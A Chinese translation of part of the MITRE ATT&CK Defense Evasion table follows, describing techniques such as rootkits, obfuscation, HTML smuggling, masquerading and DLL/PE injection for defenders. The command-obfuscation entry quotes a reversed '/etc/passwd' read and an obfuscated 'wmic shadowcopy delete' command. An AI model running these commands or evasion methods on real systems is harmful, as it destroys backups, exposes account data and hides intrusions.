---
hide:
  - toc
---

# 防御逃避

攻击者试图避免被检测到。

### 技术： 204

| 编号 | 名字 | 描述 |
| --- | --- | --- |
| [T1006](../techniques/T1006.md) | 直接卷访问 | 对手可能直接访问卷以绕过文件访问控制和文件系统监控。Windows允许程序直接访问逻辑卷。具有直接访问权限的程序可以通过分析文件系统数据结构直接从驱动器读取和写入文件。此技术可能绕过Windows文件访问控制以及文件系统监控工具。(引用: Hakobyan 2009)  存在执行这些操作的实用程序，例如`NinjaCopy`，可以在PowerShell中执行。(引用: Github PowerSploit Ninjacopy) 对手还可以使用内置或第三方实用程序（如`vssadmin`、`wbadmin`和[esentutl](https://attack.mitre.org/software/S0404)）从系统卷创建影子副本或备份数据。(引用: LOLBAS Esentutl) |
| [T1014](../techniques/T1014.md) | Rootkit | 对手可能会使用rootkit来隐藏程序、文件、网络连接、服务、驱动程序和其他系统组件的存在。Rootkit是通过拦截/挂钩和修改操作系统API调用来隐藏恶意软件存在的程序。(引用: Symantec Windows Rootkits)  Rootkit或启用rootkit的功能可能驻留在操作系统的用户级别或内核级别，甚至更低，包括虚拟机监控程序、主引导记录或[系统固件](https://attack.mitre.org/techniques/T1542/001)。(引用: Wikipedia Rootkit) 已经发现了适用于Windows、Linux和Mac OS X系统的rootkit。(引用: CrowdStrike Linux Rootkit)(引用: BlackHat Mac OSX Rootkit) |
| [T1027](../techniques/T1027.md) | 混淆的文件或信息 | 对手可能会尝试通过加密、编码或以其他方式混淆其内容，使可执行文件或文件难以发现或分析。这是常见的行为，可以跨不同平台和网络使用，以规避防御。  有效载荷可能会被压缩、归档或加密，以避免检测。这些有效载荷可能在初始访问期间使用，也可能在以后使用以减轻检测。有时需要用户操作来打开和[解混淆/解码文件或信息](https://attack.mitre.org/techniques/T1140)以进行[用户执行](https://attack.mitre.org/techniques/T1204)。用户还可能需要输入密码以打开对手提供的密码保护的压缩/加密文件。(引用: Volexity PowerDuke 2016 年 11 月) 对手还可能使用压缩或归档的脚本，例如 JavaScript。  文件的部分内容也可以被编码，以隐藏原本有助于防御者发现的明文字符串。(引用: Linux/Cdorked.A 我们生活的安全分析) 有效载荷也可能被拆分成单独的、看似无害的文件，只有在重新组装时才会显示恶意功能。(引用: Carbon Black 混淆 2016 年 9 月)  对手还可能滥用[命令混淆](https://attack.mitre.org/techniques/T1027/010)来混淆从有效载荷或直接通过[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)执行的命令。环境变量、别名、字符和其他平台/语言特定的语义可以用来规避基于签名的检测和应用程序控制机制。(引用: FireEye 混淆 2017 年 6 月) (引用: FireEye Revoke-Obfuscation 2017 年 7 月)(引用: PaloAlto EncodedCommand 2017 年 3 月) |
| [T1027.001](../techniques/T1027.001.md) | 二进制填充 | 对手可能使用二进制填充添加垃圾数据并更改恶意软件的磁盘表示。这可以在不影响二进制文件功能或行为的情况下完成，但可以将二进制文件的大小增加到某些安全工具由于文件大小限制而无法处理的程度。  二进制填充有效地更改了文件的校验和，还可以用于避免基于哈希的黑名单和静态防病毒签名。(引用: ESET OceanLotus) 填充通常由函数生成垃圾数据，然后附加到末尾或应用于恶意软件的部分。(引用: Securelist Malware Tricks April 2017) 增加文件大小可能会降低某些工具和检测能力的有效性，这些工具和检测能力未设计或配置为扫描大文件。这也可能减少被收集进行分析的可能性。公共文件扫描服务（如 VirusTotal）限制上传文件的最大分析大小。(引用: VirusTotal FAQ) |
| [T1027.002](../techniques/T1027.002.md) | 软件打包 | 对手可能会执行软件打包或虚拟机软件保护来隐藏他们的代码。软件打包是一种压缩或加密可执行文件的方法。打包可执行文件会更改文件签名，以尝试避免基于签名的检测。大多数解压技术会在内存中解压可执行代码。虚拟机软件保护将可执行文件的原始代码转换为只有特殊虚拟机才能运行的特殊格式。然后调用虚拟机来运行此代码。(引用: ESET FinFisher Jan 2018)  用于执行软件打包的工具称为打包器。示例打包器有MPRESS和UPX。已知打包器的更全面列表可用，但对手可能会创建自己的打包技术，这些技术不会留下与已知打包器相同的工件，以规避防御。(引用: Awesome Executable Packing) |
| [T1027.003](../techniques/T1027.003.md) | 隐写术 | 对手可能会使用隐写术技术隐藏命令和控制流量，使检测工作更加困难。隐写术技术可以用于在系统之间传输的数字消息中隐藏数据。这些隐藏的信息可以用于控制受感染系统。在某些情况下，嵌入隐写术的文件（如图像或文档文件）的传递可以用于命令和控制。 |
| [T1027.004](../techniques/T1027.004.md) | 交付后编译 | 对手可能会尝试通过将文件作为未编译代码交付给受害者，使有效载荷难以发现和分析。基于文本的源代码文件可能会规避针对可执行文件/二进制文件的保护的分析和审查。这些有效载荷在执行之前需要编译；通常通过本机实用程序如ilasm.exe(引用: ATTACK IQ)、csc.exe或GCC/MinGW。(引用: ClearSky MuddyWater Nov 2018)  源代码有效载荷也可能被加密、编码和/或嵌入到其他文件中，例如通过[网络钓鱼](https://attack.mitre.org/techniques/T1566)交付的文件。有效载荷也可能以本机操作系统无法识别且本质上无害的格式交付（例如：macOS/Linux上的EXE），然后在稍后使用捆绑的编译器和执行框架重新编译为适当的可执行二进制文件。(引用: TrendMicro WindowsAppMac) |
| [T1027.005](../techniques/T1027.005.md) | 从工具中删除指标 | 如果对手认为其恶意工具被检测到、隔离或以其他方式受限，他们可能会从工具中删除指标。他们可以通过删除指标来修改工具，并使用更新版本，该版本不再被目标的防御系统或可能使用类似系统的后续目标检测到。  一个很好的例子是，当恶意软件被文件签名检测到并被防病毒软件隔离时。如果对手能够确定恶意软件因其文件签名而被隔离，他们可能会修改文件以明确避免该签名，然后重新使用恶意软件。 |
| [T1027.006](../techniques/T1027.006.md) | HTML 走私 | 对手可能通过将恶意负载隐藏在看似无害的 HTML 文件中，绕过内容过滤器。HTML 文档可以存储称为 JavaScript Blobs（表示原始字节的不可变数据）的大型二进制对象，这些对象可以稍后构造成类似文件的对象。数据也可以存储在数据 URL 中，这些 URL 允许在 HTML 文档内嵌入媒体类型或 MIME 文件。HTML5 还引入了一个下载属性，可以用于启动文件下载。(引用: HTML Smuggling Menlo Security 2020)(引用: Outlflank HTML Smuggling 2018)  对手可能通过滥用 JavaScript Blobs 和/或 HTML5 下载属性，通过 HTML 走私将负载传递给受害者，从而绕过安全控制。Web 内容过滤器等安全控制可能无法识别隐藏在 HTML/JS 文件中的走私恶意文件，因为内容可能基于通常无害的 MIME 类型，如 <code>text/plain</code> 和/或 <code>text/html</code>。恶意文件或数据可以通过数据 URL 和/或 JavaScript Blobs 在 HTML 文件中进行混淆和隐藏，并在到达受害者时进行解混淆（即 [解混淆/解码文件或信息](https://attack.mitre.org/techniques/T1140)），可能绕过内容过滤器。  例如，JavaScript Blobs 可以被滥用以在受害者机器上动态生成恶意文件，并可以通过滥用 JavaScript 函数如 <code>msSaveBlob</code> 将其丢弃到磁盘上。(引用: HTML Smuggling Menlo Security 2020)(引用: MSTIC NOBELIUM May 2021)(引用: Outlflank HTML Smuggling 2018)(引用: nccgroup Smuggling HTA 2017) |
| [T1027.007](../techniques/T1027.007.md) | 动态API解析 | 攻击者可能会混淆然后动态解析其恶意软件调用的API函数，以隐藏恶意功能并阻碍防御分析。恶意软件通常使用操作系统提供的各种[Native API](https://attack.mitre.org/techniques/T1106)函数来执行各种任务，例如涉及进程、文件和其他系统工件的任务。  恶意软件调用的API函数可能会在负载文件中留下静态工件，例如字符串。防御分析师还可能通过导入地址表（IAT）或其他帮助动态链接调用代码到提供函数的共享模块的结构来揭示二进制文件可能执行的函数。(引用: Huntress API哈希)(引用: IRED API哈希)  为了避免静态或其他防御分析，攻击者可能使用动态API解析来隐藏恶意软件的特征和功能。类似于[软件打包](https://attack.mitre.org/techniques/T1027/002)，动态API解析可能会更改文件签名并混淆恶意API函数调用，直到它们在运行时被解析和调用。  可以使用各种方法来混淆恶意软件对API函数的调用。例如，函数名称的哈希通常存储在恶意软件中，而不是字面字符串。恶意软件可以使用这些哈希（或其他标识符）手动复制链接和加载过程，使用`GetProcAddress()`和`LoadLibrary()`等函数。这些哈希/标识符还可以通过加密或其他字符串操作技巧进一步混淆（需要在执行期间进行各种形式的[反混淆/解码文件或信息](https://attack.mitre.org/techniques/T1140)）。(引用: BlackHat API打包器)(引用: Drakonia HInvoke)(引用: Huntress API哈希) |
| [T1027.008](../techniques/T1027.008.md) | 剥离有效负载 | 对手可能会尝试通过删除符号、字符串和其他人类可读信息使有效负载难以分析。脚本和可执行文件可能包含变量名称和其他帮助开发人员记录代码功能的字符串。符号通常由操作系统的 `linker` 在编译可执行有效负载时创建。逆向工程师使用这些符号和字符串来分析代码并识别有效负载中的功能。(引用: Mandiant golang stripped binaries explanation)(引用: intezer stripped binaries elf files 2018)  对手可能会使用剥离有效负载以使恶意软件分析更加困难。例如，编译器和其他工具可能提供删除或混淆字符串和符号的功能。对手还使用剥离有效负载格式，例如仅运行 AppleScripts，这是[AppleScript](https://attack.mitre.org/techniques/T1059/002) 的编译和剥离版本，以逃避检测和分析。缺乏人类可读信息可能直接阻碍有效负载的检测和分析。(引用: SentinelLabs reversing run-only applescripts 2021) |
| [T1027.009](../techniques/T1027.009.md) | 嵌入式有效负载 | 对手可能会将有效负载嵌入其他文件中，以隐藏恶意内容以避开防御。看似无害的文件（如脚本和可执行文件）可能会被滥用来携带和混淆恶意有效负载和内容。在某些情况下，嵌入式有效负载还可能通过不影响执行控制（如数字签名和公证票据）来[颠覆信任控制](https://attack.mitre.org/techniques/T1553)。(引用: Sentinel Labs)  对手可能会将有效负载嵌入各种文件格式中以隐藏有效负载。(引用: Microsoft Learn) 这类似于[隐写术](https://attack.mitre.org/techniques/T1027/003)，但不涉及将恶意内容编织到与合法数字媒体格式相关的特定字节和模式中。(引用: GitHub PSImage)  例如，对手已被观察到将有效负载嵌入或作为看似无害的二进制文件的覆盖。(引用: Securelist Dtrack2) 对手还被观察到在同一格式的文件中嵌套有效负载（如可执行文件和仅运行脚本）。(引用: SentinelLabs reversing run-only applescripts 2021)  嵌入的内容还可以用作[进程注入](https://attack.mitre.org/techniques/T1055)有效负载，用于感染无害的系统进程。(引用: Trend Micro) 这些嵌入然后注入的有效负载可能用作恶意软件模块的一部分，旨在提供特定功能，例如加密C2通信以支持协调器模块。例如，嵌入的模块可能会注入默认浏览器，允许对手然后通过网络进行通信。(引用: Malware Analysis Report ComRAT) |
| [T1027.010](../techniques/T1027.010.md) | 命令混淆 | 对手可能会在命令执行期间混淆内容，以阻碍检测。命令行混淆是一种使命令和脚本中的字符串和模式更难以签名和分析的方法。这种类型的混淆可以包含在由传递的负载（例如，[网络钓鱼](https://attack.mitre.org/techniques/T1566) 和 [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)）执行的命令中，或通过 [命令和脚本解释器](https://attack.mitre.org/techniques/T1059) 交互执行。(引用: Akamai JS)(引用: Malware Monday VBE)  例如，对手可能会滥用使用各种符号和转义字符（如空格、`^`、`+`、`$` 和 `%`）的语法，使命令难以分析，同时保持相同的预期功能。(引用: RC PowerShell) 许多语言支持内置的混淆形式，如 base64 或 URL 编码。(引用: Microsoft PowerShellB64) 对手还可能通过字符串拆分（`“Wor”+“d.Application”`）、字符顺序和大小写（`rev <<<'dwssap/cte/ tac'`）、globing（`mkdir -p '/tmp/:&$NiA'`）以及涉及通过令牌/环境变量/输入流传递字符串的各种技巧手动实现命令混淆。(引用: Bashfuscator Command Obfuscators)(引用: FireEye Obfuscation June 2017)  对手还可能使用目录遍历等技巧来混淆命令引用的二进制文件（`C:\voi\pcw\..\..\Windows\tei\qs\k\..\..\..\system32\erool\..\wbem\wg\je\..\..\wmic.exe shadowcopy delete`）。(引用: Twitter Richard WMIC)  工具如 <code>Invoke-Obfuscation</code> 和 <code>Invoke-DOSfucation</code> 也已被用来混淆命令。(引用: Invoke-DOSfuscation)(引用: Invoke-Obfuscation) |
| [T1027.011](../techniques/T1027.011.md) | 无文件存储 | 对手可能会将数据存储在“无文件”格式中，以隐藏恶意活动免受防御措施的检测。无文件存储可以广泛定义为任何文件以外的格式。Windows系统中常见的非易失性无文件存储示例包括Windows注册表、事件日志或WMI存储库。(引用: Microsoft Fileless)(引用: SecureList Fileless) 在Linux系统中，共享内存目录如`/dev/shm`、`/run/shm`、`/var/run`和`/var/lock`也可以被视为无文件存储，因为写入这些目录的文件直接映射到RAM而不是存储在磁盘上。(引用: Elastic Binary Executed from Shared Memory Directory)(引用: Akami Frog4Shell 2024)(引用: Aquasec Muhstik Malware 2024)  类似于无文件内存行为（如[反射代码加载](https://attack.mitre.org/techniques/T1620)和[进程注入](https://attack.mitre.org/techniques/T1055)），无文件数据存储可能不会被只能访问特定磁盘存储文件格式的防病毒和其他端点安全工具检测到。利用无文件存储还可以使对手绕过Linux中只读文件系统提供的保护。(引用: Sysdig Fileless Malware 23022)  对手可能会使用无文件存储来隐藏各种类型的存储数据，包括负载/外壳代码（可能用于[持久性](https://attack.mitre.org/tactics/TA0003)）和尚未从受害者处外传的收集数据（例如，[本地数据暂存](https://attack.mitre.org/techniques/T1074/001)）。对手还经常在存储时加密、编码、拼接或以其他方式混淆这些无文件数据。  某些形式的无文件存储活动可能会间接在文件系统中创建工件，但以中央和其他难以检查的格式存在，例如WMI（例如，`%SystemRoot%\System32\Wbem\Repository`）或注册表（例如，`%SystemRoot%\System32\Config`）物理文件。(引用: Microsoft Fileless) |
| [T1027.012](../techniques/T1027.012.md) | LNK 图标走私 | 对手可能会通过将命令隐藏在看似无害的 Windows 快捷方式文件中来绕过内容过滤器，下载恶意有效载荷。Windows 快捷方式文件 (.LNK) 包含许多元数据字段，包括用于指定要在主机目录中显示的 LNK 文件图标文件路径的图标位置字段（也称为 `IconEnvironmentDataBlock`）。  对手可能会滥用这些 LNK 元数据来下载恶意有效载荷。例如，对手已被观察到使用 LNK 文件作为网络钓鱼有效载荷来投放恶意软件。一旦调用（例如，[恶意文件](https://attack.mitre.org/techniques/T1204/002)），通过 LNK 图标位置字段中的外部 URL 引用的有效载荷可能会被下载。这些文件也可能通过 LNK 目标路径字段中的[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)/[系统二进制代理执行](https://attack.mitre.org/techniques/T1218)参数调用。  LNK 图标走私也可能在妥协后使用，例如恶意脚本在受感染主机上执行 LNK 以下载其他恶意有效载荷。 |
| [T1027.013](../techniques/T1027.013.md) | 加密/编码文件 | 对手可能会加密或编码文件，以混淆字符串、字节和其他特定模式，从而阻碍检测。加密和/或编码文件内容旨在隐藏入侵中使用的恶意工件。许多其他技术，如[软件打包](https://attack.mitre.org/techniques/T1027/002)、[隐写术](https://attack.mitre.org/techniques/T1027/003)和[嵌入式有效负载](https://attack.mitre.org/techniques/T1027/009)，也有相同的广泛目标。加密和/或编码文件可能导致静态签名检测的失效，只有在执行/使用时（即[解混淆/解码文件或信息](https://attack.mitre.org/techniques/T1140)）才会揭示这些恶意内容。  这种类型的文件混淆可以应用于受害者主机上的许多文件工件，如恶意软件日志/配置和有效负载文件。(引用: File obfuscation) 文件可以使用硬编码或用户提供的密钥进行加密，也可以使用标准编码/压缩方案（如Base64）进行混淆。  可以对文件的整个内容进行混淆，也可以只对特定功能或值（如C2地址）进行混淆。加密和编码也可以应用于冗余层以提供额外保护。  例如，对手可能会滥用密码保护的Word文档或自解压（SFX）归档文件，作为加密/编码文件（如[网络钓鱼](https://attack.mitre.org/techniques/T1566)有效负载）的方法。这些文件通常通过将预期的归档内容附加到解压缩存根来工作，当文件被调用时执行（例如[用户执行](https://attack.mitre.org/techniques/T1204)）。(引用: SFX - Encrypted/Encoded File)  对手还可能滥用特定文件的编码方案以及自定义编码方案。例如，可以滥用文本文件中的字节顺序标记（BOM）头来操纵和混淆文件内容，直到[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)执行。 |
| [T1027.014](../techniques/T1027.014.md) | 多态代码 | 对手可能会利用多态代码（也称为变形或变异代码）来规避检测。多态代码是一种能够在代码执行期间更改其运行时足迹的软件类型。(引用: polymorphic-blackberry) 每次执行软件时，代码都会变异成不同版本的自身，达到与原始代码相同的目的或目标。此功能使恶意软件能够规避传统的基于签名的防御，例如防病毒和反恶意软件工具。(引用: polymorphic-sentinelone)  其他混淆技术可以与多态代码结合使用，以实现预期效果，包括使用变异引擎执行操作，例如[软件打包](https://attack.mitre.org/techniques/T1027/002)、[命令混淆](https://attack.mitre.org/techniques/T1027/010)或[加密/编码文件](https://attack.mitre.org/techniques/T1027/013)。(引用: polymorphic-linkedin)(引用: polymorphic-medium)  |
| [T1036](../techniques/T1036.md) | 伪装 | 对手可能会尝试操纵其工件的特征，使其看起来合法或对用户和/或安全工具无害。伪装发生在对象（合法或恶意）的名称或位置被操纵或滥用，以规避防御和观察。这可能包括操纵文件元数据、欺骗用户误识别文件类型以及给予合法任务或服务名称。  重命名可滥用的系统实用程序以规避安全监控也是一种[伪装](https://attack.mitre.org/techniques/T1036)。(引用: LOLBAS Main Site) |
| [T1036.001](../techniques/T1036.001.md) | 无效代码签名 | 对手可能会尝试模仿有效代码签名的特征，以增加欺骗用户、分析师或工具的机会。代码签名为开发人员提供了对二进制文件的真实性保证，并保证二进制文件未被篡改。对手可以复制签名程序的元数据和签名信息，然后将其用作未签名程序的模板。具有无效代码签名的文件将无法通过数字签名验证检查，但它们可能看起来更合法，用户和安全工具可能会错误地处理这些文件。(引用: Threatexpress MetaTwin 2017)  与[代码签名](https://attack.mitre.org/techniques/T1553/002)不同，此活动不会导致有效签名。 |
| [T1036.002](../techniques/T1036.002.md) | 右到左覆盖 | 对手可能会滥用右到左覆盖 (RTLO 或 RLO) 字符 (U+202E) 来伪装字符串和/或文件名，使其看起来无害。RTLO 是一个不可打印的 Unicode 字符，会导致其后的文本以相反的顺序显示。例如，一个名为 <code>March 25 \u202Excod.scr</code> 的 Windows 屏幕保护程序可执行文件将显示为 <code>March 25 rcs.docx</code>。一个名为 <code>photo_high_re\u202Egnp.js</code> 的 JavaScript 文件将显示为 <code>photo_high_resj.png</code>。(引用: Infosecinstitute RTLO Technique)  对手可能会滥用 RTLO 字符作为一种手段，欺骗用户执行他们认为是无害文件类型的文件。这种技术的常见用途是与[鱼叉式网络钓鱼附件](https://attack.mitre.org/techniques/T1566/001)/[恶意文件](https://attack.mitre.org/techniques/T1204/002)一起使用，因为它可以欺骗最终用户和防御者，如果他们不知道他们的工具如何显示和呈现 RTLO 字符。RTLO 字符的使用已在许多有针对性的入侵尝试和犯罪活动中被发现。(引用: Trend Micro PLEAD RTLO)(引用: Kaspersky RTLO Cyber Crime) RTLO 也可以在 Windows 注册表中使用，其中 regedit.exe 显示反转的字符，但命令行工具 reg.exe 默认不显示。 |
| [T1036.003](../techniques/T1036.003.md) | 重命名系统实用程序 | 对手可能会重命名合法的系统实用程序，以试图规避与这些实用程序使用相关的安全机制。可能存在针对对手能够滥用的系统实用程序的安全监控和控制机制。(引用: LOLBAS Main Site) 通过在使用之前重命名实用程序（例如：重命名<code>rundll32.exe</code>），可能绕过这些安全机制。(引用: Elastic Masquerade Ball) 另一种情况是，当合法实用程序被复制或移动到不同目录并重命名，以避免基于非标准路径执行系统实用程序的检测。(引用: F-Secure CozyDuke) |
| [T1036.004](../techniques/T1036.004.md) | 伪装任务或服务 | 对手可能会尝试操纵任务或服务的名称，使其看起来合法或无害。由任务计划程序或systemd执行的任务/服务通常会被赋予一个名称和/或描述。(引用: TechNet Schtasks)(引用: Systemd Service Units) Windows服务将有一个服务名称以及显示名称。许多合法任务和服务存在，具有常见的关联名称。对手可能会给任务或服务起一个类似或相同于合法任务或服务的名称。  任务或服务包含其他字段，例如描述，对手可能会尝试使其看起来合法。(引用: Palo Alto Shamoon Nov 2016)(引用: Fysbis Dr Web Analysis) |
| [T1036.005](../techniques/T1036.005.md) | 匹配合法名称或位置 | 对手可能会在命名/放置文件时匹配或近似合法文件或资源的名称或位置。这是为了逃避防御和观察。可以通过将可执行文件放置在常见的受信目录（例如 System32 下）或给它一个合法的、受信程序的名称（例如 svchost.exe）来实现。在容器化环境中，这也可以通过在命名空间中创建与容器 pod 或集群的命名约定匹配的资源来实现。或者，给定的文件或容器镜像名称可能是合法程序/镜像的近似值或看似无害的名称。  对手还可能使用他们试图模仿的文件的相同图标。 |
| [T1036.006](../techniques/T1036.006.md) | 文件名后的空格 | 攻击者可以通过更改文件的扩展名来隐藏程序的真实文件类型。对于某些文件类型（特别是这不适用于.app扩展名），在文件名末尾附加空格将改变操作系统处理文件的方式。  例如，如果有一个名为<code>evil.bin</code>的Mach-O可执行文件，当用户双击它时，它将启动Terminal.app并执行。如果将此文件重命名为<code>evil.txt</code>，则当用户双击它时，它将使用默认的文本编辑应用程序启动（不执行二进制文件）。但是，如果文件重命名为<code>evil.txt </code>（注意末尾的空格），则当用户双击它时，操作系统将确定真实文件类型并适当处理，二进制文件将被执行。(引用: Mac后门回归)  攻击者可以利用此功能诱使用户双击任何格式的看似无害的文件，最终执行恶意内容。 |
| [T1036.007](../techniques/T1036.007.md) | 双重文件扩展名 | 对手可能会滥用文件名中的双重扩展名作为伪装真实文件类型的一种手段。文件名可能包含一个次要文件类型扩展名，这可能导致只显示第一个扩展名（例如：<code>File.txt.exe</code> 在某些视图中可能仅显示为 <code>File.txt</code>）。然而，第二个扩展名是真实的文件类型，决定了文件的打开和执行方式。操作系统在文件浏览器（例如：explorer.exe）中可能会隐藏真实的文件扩展名，以及在使用或类似于系统策略配置的任何软件中。(引用: PCMag DoubleExtension)(引用: SOCPrime DoubleExtension)  对手可能会滥用双重扩展名来试图隐藏有效负载的危险文件类型。一个非常常见的用法是诱骗用户打开他们认为是无害文件类型但实际上是可执行代码的文件。这类文件通常作为电子邮件附件出现，并允许对手通过[鱼叉式网络钓鱼附件](https://attack.mitre.org/techniques/T1566/001)和[用户执行](https://attack.mitre.org/techniques/T1204)获得对用户系统的[初始访问](https://attack.mitre.org/tactics/TA0001)。例如，名为 <code>Evil.txt.exe</code> 的可执行文件附件可能显示为 <code>Evil.txt</code>。用户可能会将其视为无害的文本文件并打开它，从而无意中执行隐藏的恶意软件。(引用: SOCPrime DoubleExtension)  常见的文件类型，如文本文件（.txt、.doc 等）和图像文件（.jpg、.gif 等）通常用作第一个扩展名以显得无害。通常被视为危险的可执行扩展名，如 .exe、.lnk、.hta 和 .scr，通常作为第二个扩展名和真实文件类型出现。 |
| [T1036.008](../techniques/T1036.008.md) | 伪装文件类型 | 对手可能会通过更改有效负载的格式，包括文件的签名、扩展名和内容，将恶意负载伪装为合法文件。各种文件类型都有一个典型的标准格式，包括它们的编码和组织方式。例如，文件的签名（也称为头或魔术字节）是文件的开始字节，通常用于识别文件的类型。例如，JPEG文件的头是<code>0xFF 0xD8</code>，文件扩展名是`.JPE`、`.JPEG`或`.JPG`。  对手可能会编辑头的十六进制代码和/或恶意负载的文件扩展名，以绕过文件验证检查和/或输入清理。这种行为通常在传输（例如，[工具传输](https://attack.mitre.org/techniques/T1105)）和存储（例如，[上传恶意软件](https://attack.mitre.org/techniques/T1608/001)）负载文件时使用，以便对手可以移动他们的恶意软件而不会触发检测。  常见的非可执行文件类型和扩展名，例如文本文件（`.txt`）和图像文件（`.jpg`、`.gif`等）通常被视为无害。基于此，对手可能会使用文件扩展名来伪装恶意软件，例如将PHP后门代码命名为<code>test.gif</code>。用户可能不知道文件是恶意的，因为它看起来无害且文件扩展名无害。  多态文件，即具有多种不同文件类型并根据将执行它们的应用程序而不同功能的文件，也可能用于伪装恶意软件和功能。(引用: polygot_icedID) |
| [T1036.009](../techniques/T1036.009.md) | 打破进程树 | 对手可能会尝试通过修改执行的恶意软件的父进程ID（PPID）来规避基于进程树的分析。如果端点保护软件利用“父子”关系进行检测，打破这种关系可能导致对手的行为不与先前的进程树活动相关联。在基于Unix的系统上，打破此进程树是管理员使用脚本和程序执行软件的常见做法。(引用: 3OHA double-fork 2022)  在Linux系统上，对手可能会执行一系列[本机API](https://attack.mitre.org/techniques/T1106)调用来更改恶意软件的进程树。例如，对手可以在没有任何参数的情况下执行其有效负载，调用`fork()` API调用两次，然后让父进程退出。这会创建一个没有父进程的孙进程，该进程立即被`init`系统进程（PID 1）收养，从而成功断开对手有效负载的执行与其先前的进程树的连接。  另一个示例是使用“daemon”系统调用从当前父进程分离并在后台运行。(引用: Sandfly BPFDoor 2022)(引用: Microsoft XorDdos Linux Stealth 2022) |
| [T1036.010](../techniques/T1036.010.md) | 伪装账户名称 | 对手可能会匹配或近似合法账户的名称，使新创建的账户看起来无害。这通常会在 [创建账户](https://attack.mitre.org/techniques/T1136) 期间发生，尽管账户也可能在以后重命名。这也可能与 [账户访问移除](https://attack.mitre.org/techniques/T1531) 同时发生，如果对手首先删除一个账户，然后重新创建一个具有相同名称的账户。(引用: Huntress MOVEit 2023)  通常，对手会尝试伪装成服务账户，例如与合法软件、数据备份或容器集群管理相关的账户。(引用: Elastic CUBA Ransomware 2022)(引用: Aquasec Kubernetes Attack 2023) 他们还可能给账户起一个通用的、值得信赖的名称，例如“admin”、“help”或“root”。(引用: Invictus IR Cloud Ransomware 2024) 有时对手可能会根据系统中已经存在的账户来命名账户，作为 [账户发现](https://attack.mitre.org/techniques/T1087) 的后续行为。  请注意，这与 [冒充](https://attack.mitre.org/techniques/T1656) 不同，后者描述的是冒充特定的受信任个人或组织，而不是用户或服务账户名称。 |
| [T1055](../techniques/T1055.md) | 进程注入 | 对手可能会将代码注入进程，以规避基于进程的防御措施，并可能提升权限。进程注入是一种在单独的活动进程的地址空间中执行任意代码的方法。在另一个进程的上下文中运行代码可能允许访问进程的内存、系统/网络资源，并可能提升权限。通过进程注入进行的执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。  有许多不同的方法可以将代码注入进程，其中许多滥用合法功能。这些实现存在于每个主要操作系统中，但通常是特定于平台的。  更复杂的样本可能会执行多个进程注入以分段模块并进一步规避检测，利用命名管道或其他进程间通信（IPC）机制作为通信通道。 |
| [T1055.001](../techniques/T1055.001.md) | 动态链接库注入 | 对手可能会注入动态链接库（DLL）到进程中，以规避基于进程的防御并可能提升权限。DLL注入是一种在独立活动进程的地址空间中执行任意代码的方法。  DLL注入通常通过在目标进程的虚拟地址空间中写入DLL路径，然后通过调用新线程加载DLL来执行。写入可以通过本机Windows API调用如<code>VirtualAllocEx</code>和<code>WriteProcessMemory</code>来执行，然后通过<code>CreateRemoteThread</code>（调用负责加载DLL的<code>LoadLibrary</code> API）来调用。(引用: Elastic Process Injection July 2017)  这种方法的变体如反射DLL注入（将自映射DLL写入进程）和内存模块（在写入进程时映射DLL）克服了地址重定位问题以及调用执行的额外API（因为这些方法通过手动执行<code>LoadLibrary</code>的功能来加载和执行文件）。(引用: Elastic HuntingNMemory June 2017)(引用: Elastic Process Injection July 2017)  这种方法的另一种变体，通常称为模块踩踏/重载或DLL空洞，可能被用来在进程中隐藏注入的代码。这种方法涉及将合法DLL加载到远程进程中，然后在目标进程中启动新线程之前手动覆盖模块的<code>AddressOfEntryPoint</code>。(引用: Module Stomping for Shellcode Injection) 这种变体允许攻击者通过在磁盘上可能备份其执行的合法DLL文件来隐藏恶意注入代码。(引用: Hiding Malicious Code with Module Stomping)  在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源，并可能提升权限。通过DLL注入执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。 |
| [T1055.002](../techniques/T1055.002.md) | 可移植可执行文件注入 | 对手可能会将可移植可执行文件 (PE) 注入进程中，以规避基于进程的防御并可能提升权限。PE 注入是一种在单独的活动进程的地址空间中执行任意代码的方法。  PE 注入通常通过将代码（可能没有磁盘上的文件）复制到目标进程的虚拟地址空间中，然后通过新线程调用它来执行。可以使用本机 Windows API 调用（例如<code>VirtualAllocEx</code>和<code>WriteProcessMemory</code>）执行写入，然后使用<code>CreateRemoteThread</code>或其他代码（例如 shellcode）调用。注入代码的位移引入了重新映射内存引用的附加要求。(引用: Elastic Process Injection July 2017)  在另一个进程的上下文中运行代码可能允许访问进程的内存、系统/网络资源，并可能提升权限。通过 PE 注入执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。 |
| [T1055.003](../techniques/T1055.003.md) | 线程执行劫持 | 对手可能会将恶意代码注入劫持的进程中，以规避基于进程的防御措施，并可能提升权限。线程执行劫持是一种在单独的活动进程的地址空间中执行任意代码的方法。  线程执行劫持通常通过挂起现有进程然后取消/空洞化其内存来执行，然后可以用恶意代码或DLL路径替换。首先使用本机Windows API调用（如<code>OpenThread</code>）创建现有受害进程的句柄。此时，可以挂起进程，然后写入、重新对齐到注入的代码，并通过分别调用<code>SuspendThread</code>、<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>、<code>SetThreadContext</code>和<code>ResumeThread</code>恢复。(引用: Elastic Process Injection July 2017)  这与[进程空洞](https://attack.mitre.org/techniques/T1055/012)非常相似，但目标是现有进程，而不是在挂起状态下创建进程。  在另一个进程的上下文中运行代码可能允许访问进程的内存、系统/网络资源，并可能提升权限。通过线程执行劫持进行的执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。 |
